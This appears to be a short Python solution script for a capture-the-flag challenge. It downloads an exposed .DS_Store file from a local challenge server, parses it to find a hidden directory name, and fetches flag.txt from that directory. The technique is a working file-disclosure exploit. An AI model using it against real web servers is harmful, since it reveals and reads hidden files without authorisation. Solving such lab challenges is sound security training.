#!/usr/bin/env python3

from ds_store import DSStore
import requests

HOST = "localhost"
PORT = 30003

r = requests.get(f"https://{HOST}:{PORT}/.DS_Store", stream=True)

with open("DS_Store", 'wb') as f:
    for chunk in r.iter_content(chunk_size=1024):
        if chunk:
            _ = f.write(chunk)

with DSStore.open("DS_Store") as ds:
    for entry in ds:
        filename = entry.filename
        break

r = requests.get(f"https://{HOST}:{PORT}/{filename}/flag.txt")

print(f"Flag: {r.text.strip()}")
